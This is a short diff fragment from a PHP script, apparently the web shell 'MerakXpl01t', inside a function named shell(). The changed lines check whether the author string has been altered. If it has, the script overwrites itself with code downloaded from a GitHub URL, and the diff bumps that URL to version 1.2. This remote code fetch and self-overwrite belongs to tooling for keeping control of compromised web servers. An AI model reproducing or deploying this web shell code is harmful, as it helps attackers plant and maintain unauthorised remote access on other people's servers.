@@ -1191,7 +1191,7 @@ function shell()
 if (author != 'MerakXpl01t') {
    $file = basename($_SERVER['SCRIPT_FILENAME']);
    $open = fopen($file, 'w');
-   fwrite($open, file_get_contents('https://github.com/didin-pixel/MerakXpl01t/blob/main/merakxpl01t.php'));
+   fwrite($open, file_get_contents('https://github.com/didin-pixel/MerakXpl01t/blob/main/merakxpl01t-v1.2.php'));
    fclose($open);
 
    echo '<script>alert("Please Dont Change Author!!")</script>';
